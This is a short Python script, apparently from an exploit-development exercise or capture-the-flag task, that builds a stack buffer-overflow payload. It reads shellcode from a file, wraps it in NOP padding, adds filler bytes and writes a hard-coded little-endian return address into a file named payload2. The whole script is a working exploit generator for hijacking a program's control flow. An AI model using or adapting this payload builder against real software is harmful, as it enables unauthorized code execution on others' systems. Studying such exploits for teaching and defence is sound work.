shellcode = ""

with open('shellcode.txt','rb') as f:
    shellcode = f.read()

with open('payload2','wb') as f:
    f.write(b'\x90'*8)
    f.write(shellcode)
    f.write(b'\x90'*(80-8-len(shellcode)))
    f.write(b'AAAABBBBCCCCDDDDEEEEFFFF')
    f.write(b'\xc0\xdd\xff\xff\xff\x7f') # 0x7f ff ff ff dd c0 insert address in bytes (little-endian)
    f.close()

print("Payload created!")